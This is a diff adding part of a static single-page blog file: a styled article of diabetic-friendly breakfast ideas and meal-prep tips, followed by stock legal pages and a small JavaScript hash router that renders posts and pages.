+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A diabetic-friendly breakfast is not about removing every carbohydrate. It is about choosing better sources, pairing them with protein and fiber, and keeping portions intentional. Whole grains, berries, oats, and fruit can all be part of a thoughtful breakfast plate.</p>
+
+<p>The meals highlighted in this breakfast chart show how much variety is possible. Some options are warm and cozy, like cinnamon oats with walnuts. Others are fresh and savory, like smoked salmon with avocado or a cucumber cottage cheese bowl. There are also grab-and-go options such as veggie egg muffins, which are especially useful for busy mornings.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Core Formula for a Better Diabetic Breakfast</h2>
+
+<p>Before looking at individual breakfast ideas, it helps to understand the simple structure behind them. A balanced diabetic breakfast does not need to follow a strict recipe every time. Instead, it can follow a flexible plate formula that works with many ingredients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Start with a Protein Source</h3>
+
+<p>Protein is often the anchor of a satisfying breakfast. In these meal ideas, protein comes from eggs, Greek yogurt, cottage cheese, smoked salmon, peanut butter, nuts, and seeds. A protein-forward breakfast can help reduce mid-morning cravings and make the meal feel complete.</p>
+
+<p>Egg-based breakfasts are especially versatile because they pair well with vegetables, herbs, whole-grain toast, avocado, and even cottage cheese. Greek yogurt and cottage cheese offer creamy, high-protein bases that can be served sweet or savory. Smoked salmon adds a more elevated brunch-style option while still keeping the meal focused on protein and healthy fats.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Fiber-Rich Ingredients</h3>
+
+<p>Fiber gives breakfast staying power. Vegetables, berries, chia seeds, oats, whole-grain bread, cucumbers, tomatoes, spinach, walnuts, and avocado all contribute fiber or nutrient density. These ingredients are a major reason the breakfast ideas feel colorful and satisfying.</p>
+
+<p>A simple way to increase fiber is to add produce to meals that might otherwise feel plain. Spinach in an omelet, berries on yogurt, tomatoes with cottage cheese, or cucumber beside salmon can make a breakfast more balanced without making it complicated.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choose Carbohydrates Thoughtfully</h3>
+
+<p>Carbohydrates can be included in diabetic-friendly breakfasts, but quality and portion size matter. Whole-grain toast, oats, English muffins, berries, and bananas can be useful choices when paired with protein and fat. The goal is not to make breakfast feel restrictive. The goal is to create a meal that supports steadier energy.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">8 Diabetic Breakfast Ideas That Feel Fresh and Satisfying</h2>
+
+<p>The breakfast ideas below are practical, visually appealing, and easy to personalize. Each one brings a different mix of textures, flavors, and nutrients, which helps prevent breakfast boredom.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Veggie Egg Muffins</h3>
+
+<p>Veggie egg muffins are one of the best make-ahead diabetic breakfast ideas because they are compact, protein-rich, and easy to portion. They are usually made by whisking eggs with chopped vegetables, then baking the mixture in a muffin tin until set. Spinach, bell peppers, tomatoes, zucchini, mushrooms, and onions all work beautifully.</p>
+
+<p>The biggest advantage of egg muffins is convenience. You can prepare a batch at the beginning of the week and reheat them quickly in the morning. They are also easy to pair with a small side of berries, avocado slices, or whole-grain toast when you want a more complete meal.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Best Add-Ins for Egg Muffins</h4>
+
+<ul>
+  <li>Spinach and cherry tomatoes</li>
+  <li>Bell peppers and onions</li>
+  <li>Mushrooms and herbs</li>
+  <li>Feta or cottage cheese in small amounts</li>
+  <li>Turkey bacon or smoked salmon for extra protein</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Greek Yogurt, Berries and Chia</h3>
+
+<p>Greek yogurt with berries and chia seeds is a simple breakfast that feels bright, creamy, and refreshing. It offers protein from the yogurt, fiber from the berries, and healthy fats from chia seeds. Berries are a popular choice for diabetic-friendly breakfasts because they bring natural sweetness, color, and antioxidants while generally being easier to portion than many sweeter fruits.</p>
+
+<p>For the best balance, choose plain Greek yogurt rather than heavily sweetened flavored varieties. You can add blueberries, raspberries, strawberries, or blackberries, then finish with chia seeds, chopped nuts, or a sprinkle of cinnamon.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If plain Greek yogurt tastes too tangy, stir in cinnamon, vanilla extract, or a few mashed berries. This adds flavor without turning the bowl into a sugar-heavy breakfast.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Avocado Toast with Poached Egg</h3>
+
+<p>Avocado toast can be a smart diabetic breakfast when it is made with whole-grain bread and topped with protein. The avocado adds creamy texture and healthy fats, while the poached egg brings protein and richness. A sprinkle of pepper, chili flakes, lemon juice, or fresh herbs can make it feel restaurant-worthy with very little effort.</p>
+
+<p>The key is to avoid oversized portions of bread and keep the toast balanced. One slice of hearty whole-grain bread topped with mashed avocado and an egg can be enough for many mornings. For extra volume, serve it with cucumber slices, tomatoes, or a side salad.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Flavor Ideas for Avocado Toast</h4>
+
+<ul>
+  <li>Lemon juice, black pepper, and parsley</li>
+  <li>Tomato slices and basil</li>
+  <li>Everything seasoning with a poached egg</li>
+  <li>Crumbled feta and cucumber</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Cottage Cheese and Cucumber Bowl</h3>
+
+<p>A cottage cheese and cucumber bowl is a fresh savory breakfast that is quick to assemble and naturally high in protein. Cottage cheese provides creaminess and protein, while cucumber adds crunch and hydration. Tomatoes bring brightness, color, and a juicy texture that makes the bowl feel more complete.</p>
+
+<p>This is an excellent option for people who prefer savory breakfasts over sweet ones. It can be seasoned with black pepper, fresh dill, chives, parsley, or a light drizzle of olive oil. Add a boiled egg or a few whole-grain crackers if you want extra staying power.</p>
+
+<div style="background:#f1f5f9;border:1px solid #d8e0ea;border-radius:12px;padding:18px 20px;margin:28px 0;color:#1e293b;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;">Savory breakfasts can be especially helpful for reducing dependence on sweet morning foods. Bowls built with cottage cheese, eggs, vegetables, salmon, or avocado make breakfast feel satisfying without needing added sugar.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Cinnamon Oats with Walnuts</h3>
+
+<p>Oats are a classic breakfast food, and they can fit into a diabetic-friendly routine when prepared thoughtfully. The best approach is to choose plain oats, avoid sugary instant packets, and add ingredients that improve balance. Cinnamon, walnuts, chia seeds, ground flaxseed, Greek yogurt, or a spoonful of nut butter can make oats more satisfying.</p>
+
+<p>Cinnamon oats with walnuts are cozy, simple, and easy to customize. Walnuts add crunch and healthy fats, while cinnamon provides warmth and flavor without added sugar. For a little sweetness, add a small portion of berries or a few banana slices, then keep the rest of the bowl protein-friendly with Greek yogurt or seeds.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Oatmeal becomes more balanced when it is not eaten alone. Pairing oats with nuts, seeds, Greek yogurt, eggs, or another protein source can make the meal more filling and help create a steadier breakfast experience.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Smoked Salmon Breakfast Plate</h3>
+
+<p>A smoked salmon breakfast plate feels elegant, but it can also be very simple. Salmon offers protein and healthy fats, while avocado, greens, cucumber, tomatoes, or capers can add freshness and flavor. This meal is ideal for anyone who wants a low-sugar breakfast with a satisfying savory profile.</p>
+
+<p>The plate can be served without bread for a lighter option, or with a small slice of whole-grain toast or rye crispbread for added fiber. Lemon juice, dill, red onion, and cracked pepper bring a bright brunch-style finish.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Simple Salmon Plate Combination</h4>
+
+<ul>
+  <li>Smoked salmon slices</li>
+  <li>Half an avocado</li>
+  <li>Cucumber rounds or leafy greens</li>
+  <li>Lemon wedge and fresh dill</li>
+  <li>Optional whole-grain crispbread</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Peanut Butter Banana English Muffin</h3>
+
+<p>A peanut butter banana English muffin is a familiar comfort breakfast with a more balanced twist when built carefully. Choose a whole-wheat English muffin, spread it with natural peanut butter, and top it with a moderate amount of banana slices. Add chia seeds, hemp seeds, or cinnamon for extra texture and flavor.</p>
+
+<p>This breakfast includes carbohydrates, so portion control matters. The peanut butter helps slow the meal down and adds satisfying fat and protein. For a more filling plate, pair half an English muffin with Greek yogurt or a boiled egg.</p>
+
+<p>It is also a good option for mornings when you want something quick, slightly sweet, and easy to assemble. The key is to skip sugary spreads and use peanut butter with simple ingredients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Spinach Omelet with Tomatoes</h3>
+
+<p>A spinach omelet with tomatoes is a breakfast staple for good reason. It is colorful, protein-rich, and packed with vegetables. Eggs provide the base, spinach adds greens, and tomatoes bring juicy sweetness and brightness. This meal works well on its own or with a small side of whole-grain toast.</p>
+
+<p>To make the omelet more flavorful, add herbs, mushrooms, peppers, or a small amount of cheese. Cooking the vegetables first helps reduce moisture and creates a better texture. A simple spinach and tomato omelet can be ready in minutes, making it a reliable weekday breakfast.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make These Breakfasts More Practical for Busy Mornings</h2>
+
+<p>The best breakfast ideas are the ones you can actually repeat. A beautiful list is helpful, but the real value comes from turning these meals into a routine that fits your schedule. Many diabetic breakfast ideas can be prepared ahead of time or partially prepped the night before.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Batch Prep Protein First</h3>
+
+<p>Protein is often the part of breakfast that takes the most time, so prepping it first makes mornings easier. Bake egg muffins, boil eggs, portion cottage cheese, or keep Greek yogurt ready in single-serving containers. Smoked salmon, turkey slices, or cooked vegetables can also be stored for quick breakfast plates.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Pre-Portion Toppings</h3>
+
+<p>Toppings make breakfast more enjoyable, but they can also lead to accidental oversized portions. Pre-portion nuts, chia seeds, peanut butter, or granola alternatives into small containers. This makes it easier to add flavor and texture without guessing every morning.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Produce Ready</h3>
+
+<p>Washed berries, sliced cucumbers, cherry tomatoes, spinach, and avocado can make breakfast feel fresh with minimal effort. Keeping produce visible in the fridge also makes it more likely that you will add it to your morning plate.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Create a breakfast prep zone in the fridge with Greek yogurt, cottage cheese, boiled eggs, berries, chopped vegetables, and greens. When everything is grouped together, balanced meals become much easier to assemble.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Smart Swaps for Diabetic-Friendly Breakfasts</h2>
+
+<p>Small swaps can make breakfast more balanced without changing the foods you enjoy. Instead of sweetened yogurt, choose plain Greek yogurt and add berries. Instead of sugary oatmeal packets, use plain oats with cinnamon and walnuts. Instead of white toast, choose whole-grain bread and top it with eggs or avocado.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Swap Sugary Cereals for Protein Bowls</h3>
+
+<p>Many breakfast cereals are quick, but they can be low in protein and high in added sugar. A Greek yogurt bowl or cottage cheese bowl is just as easy and often more satisfying. Add berries, chia, cinnamon, or a few nuts for texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Swap Pastries for Whole-Grain Toast with Protein</h3>
+
+<p>Pastries tend to be high in refined flour and added sugar. Whole-grain toast with avocado and a poached egg offers a more balanced mix of carbohydrates, fat, and protein. It also feels more filling and customizable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Swap Sweet Breakfasts for Savory Plates</h3>
+
+<p>Savory breakfasts are often naturally lower in added sugar. Eggs, salmon, vegetables, avocado, and cottage cheese can create breakfast plates that feel flavorful and satisfying without relying on sweeteners.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building a Weekly Breakfast Rotation</h2>
+
+<p>A weekly breakfast rotation can reduce decision fatigue and help you stay consistent. Instead of trying to invent something new every day, choose three or four go-to options and rotate them based on time, appetite, and ingredients.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Example Weekly Rotation</h4>
+
+<ul>
+  <li><strong>Monday:</strong> Veggie egg muffins with berries</li>
+  <li><strong>Tuesday:</strong> Greek yogurt with berries and chia</li>
+  <li><strong>Wednesday:</strong> Avocado toast with poached egg</li>
+  <li><strong>Thursday:</strong> Cottage cheese cucumber bowl</li>
+  <li><strong>Friday:</strong> Cinnamon oats with walnuts</li>
+  <li><strong>Saturday:</strong> Smoked salmon breakfast plate</li>
+  <li><strong>Sunday:</strong> Spinach omelet with tomatoes</li>
+</ul>
+
+<p>This kind of plan keeps breakfast structured while still allowing variety. You can also repeat favorites more often. If egg muffins work well for your schedule, keep them as a staple. If yogurt bowls are easiest, change the toppings to keep them interesting.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Choose protein first, then add fiber-rich produce or whole grains.</li>
+    <li>Use nuts, seeds, avocado, or olive oil for healthy fats in modest amounts.</li>
+    <li>Favor plain yogurt, plain oats, and whole-grain breads over sweetened options.</li>
+    <li>Prep egg muffins, chopped vegetables, and portioned toppings ahead of time.</li>
+    <li>Keep breakfasts colorful, simple, and realistic for your daily routine.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Better Breakfast Can Be Simple, Colorful, and Delicious</h2>
+
+<p>Diabetic breakfast ideas do not need to feel limited or boring. The most useful meals are often the ones built from simple, familiar ingredients: eggs, Greek yogurt, cottage cheese, oats, berries, vegetables, avocado, salmon, nuts, seeds, and whole grains. When these foods are combined thoughtfully, breakfast becomes more satisfying, more colorful, and easier to repeat.</p>
+
+<p>The ideas in this guide show how flexible a diabetic-friendly breakfast routine can be. Veggie egg muffins are perfect for meal prep. Greek yogurt bowls are quick and refreshing. Avocado toast with egg feels filling and modern. Cottage cheese bowls offer a savory twist. Cinnamon oats bring comfort. Smoked salmon plates feel elevated. Peanut butter banana English muffins satisfy a sweeter craving with better balance. Spinach omelets keep breakfast classic and nourishing.</p>
+
+<p>Start with one or two ideas that fit your lifestyle, then build from there. A balanced breakfast does not have to be perfect. It just needs to be intentional, satisfying, and easy enough to enjoy again tomorrow.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Diabetic Breakfast Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Balanced Meals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Low Sugar Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Blood Sugar Friendly Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Breakfast Nutrition</span>
+</div>
+
+                `
+            }
+        ];
+
+        // Static Legal Pages (Exact content and AdSense validation kept intact)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Core Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Sara's Recipes";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder path
+
+        // Function to render home list
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render static legal page
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 10px; padding-bottom: 10px;">
+                        <h1 style="font-family: 'Cormorant Garamond', serif; font-size: 2.3rem; margin-bottom: 30px;">${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Function to render single post detail view
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=100&h=100&fit=crop&auto=format&q=80'">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=800&h=500&fit=crop&q=80'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 2px; font-size: 1.1rem; color: var(--accent-color);">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0);
+        }
+
+        // Client-side router logic
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Back/Forward button history handlers
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load routing checks
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
